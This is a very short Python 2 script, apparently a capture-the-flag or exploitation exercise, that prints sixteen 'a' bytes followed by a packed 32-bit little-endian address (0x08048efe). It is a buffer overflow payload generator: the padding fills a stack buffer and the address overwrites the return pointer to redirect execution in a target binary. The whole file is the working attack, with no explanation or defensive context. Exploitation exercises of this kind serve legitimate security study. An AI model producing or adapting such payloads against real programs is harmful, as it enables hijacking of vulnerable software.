#!/usr/bin/env python
from struct import pack

print '\x61'*16 + pack('<I', 0x08048efe)